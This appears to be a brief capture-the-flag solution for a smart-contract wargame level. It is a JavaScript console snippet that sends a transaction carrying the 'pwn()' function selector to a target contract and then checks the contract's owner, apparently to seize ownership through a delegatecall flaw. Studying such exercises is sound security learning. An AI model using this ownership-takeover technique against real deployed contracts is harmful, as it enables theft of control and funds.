await sendTransaction({
    from: player,
    to: contract.address,
    data: web3.eth.abi.encodeFunctionSignature("pwn()")
})

// '0xf915b20fb579bc3c21d4e03ab017f93f360c25395021810937f48828fec36db7'

// check owner
await contract.owner()

